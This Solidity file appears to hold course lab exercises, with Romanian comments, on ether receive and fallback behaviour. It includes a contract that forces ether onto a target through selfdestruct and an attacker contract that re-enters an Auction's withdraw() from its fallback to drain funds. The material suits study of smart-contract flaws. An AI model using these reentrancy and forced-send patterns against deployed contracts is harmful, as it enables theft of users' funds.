// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import {IAuction} from "./Auction.sol";

// Ex 1.1 - copie a lui Receiver fara receive
contract ReceiverNoReceive {
    event ViaDeposit(address sender, uint256 value);
    event ViaFallback(address sender, uint256 value, bytes data);

    function deposit() external payable {
        emit ViaDeposit(msg.sender, msg.value);
    }

    function ping() external pure returns (string memory) {
        return "pong";
    }

    fallback() external payable {
        emit ViaFallback(msg.sender, msg.value, msg.data);
    }
}

// Ex 1.1 - copie a lui Receiver in care fallback NU e payable
contract ReceiverNonPayableFallback {
    event ViaDeposit(address sender, uint256 value);
    event ViaReceive(address sender, uint256 value);
    event ViaFallback(address sender, uint256 value, bytes data);

    function deposit() external payable {
        emit ViaDeposit(msg.sender, msg.value);
    }

    function ping() external pure returns (string memory) {
        return "pong";
    }

    receive() external payable {
        emit ViaReceive(msg.sender, msg.value);
    }

    // msg.value nu poate fi citit intr-o functie non-payable (Error 5887), oricum e mereu 0 aici
    fallback() external {
        emit ViaFallback(msg.sender, 0, msg.data);
    }
}

// Ex 1.2 - fallback care intoarce exact ce a primit
contract Echo {
    fallback(bytes calldata input) external returns (bytes memory) {
        return input;
    }
}

// Ex 1.3 - trimite ether fortat prin selfdestruct, chiar daca target-ul nu accepta ether
contract ForceSend {
    constructor(address target) payable {
        selfdestruct(payable(target));
    }
}

// Ex 1.4 - Attacker cu un receive gol
contract AttackerWithReceive {
    IAuction auction;

    constructor(address auctionAddress) {
        auction = IAuction(auctionAddress);
    }

    function bid() external payable {
        (bool success,) = address(auction).call{value: msg.value}(abi.encodeWithSignature("placeBid()"));
        require(success);
    }

    function attack() external payable {
        (bool success,) = address(auction).call(abi.encodeWithSignature("withdraw()"));
        require(success, "Attack failed");
    }

    // nou: transferurile simple (calldata gol) ajung aici, nu in fallback
    receive() external payable {}

    fallback() external payable {
        if (msg.value > 0) {
            uint256 bidInfo = auction.bidInfo(address(this));
            uint256 getBackValue = bidInfo / 5;
            if (address(auction).balance >= getBackValue) {
                (bool success,) = address(auction).call(abi.encodeWithSignature("withdraw()"));
                require(success);
            }
        }
    }
}
